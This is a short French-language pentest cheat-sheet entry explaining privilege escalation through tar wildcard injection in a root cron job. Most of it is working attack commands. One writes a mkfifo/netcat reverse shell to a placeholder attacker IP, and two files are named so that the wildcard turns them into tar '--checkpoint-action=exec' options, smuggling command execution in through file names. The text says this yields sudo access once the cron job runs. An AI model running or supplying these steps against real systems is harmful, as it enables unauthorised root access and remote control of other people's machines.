# Tar *
Si tar -zcf /tmp/XXX.tar.gz * est présent dans cron, il faut créer 3 fichiers spécifiques indiqué ci-dessous :
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc [ATTACKER IP] 4567>/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
Les 3 fichiers doivent être dans le répertoire où le tar va être exécuté.
Une fois le cron passé, on peut lancer un sudo bash ou sudo –u [user]
